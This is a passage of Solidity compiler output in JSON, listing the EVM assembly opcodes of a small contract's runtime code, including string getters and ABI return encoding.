											"name": "POP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "tag",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 23,
											"end": 24,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "19"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "21"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 99,
											"end": 100,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 94,
											"end": 97,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 80,
											"end": 81,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 75,
											"end": 78,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 49,
											"end": 50,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "19"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "21"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 496,
											"end": 521,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 16092,
											"end": 16308,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 16092,
											"end": 16308,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16092,
											"end": 16308,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 16092,
											"end": 16308,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 16092,
											"end": 16308,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 16092,
											"end": 16308,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 16092,
											"end": 16308,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16092,
											"end": 16308,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 16429,
											"end": 16618,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 16429,
											"end": 16618,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16429,
											"end": 16618,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 16429,
											"end": 16618,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 16429,
											"end": 16618,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 16429,
											"end": 16618,
											"name": "tag",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 16429,
											"end": 16618,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16429,
											"end": 16618,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "28"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "tag",
											"source": 0,
											"value": "28"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "tag",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "tag",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "31"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "tag",
											"source": 0,
											"value": "31"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
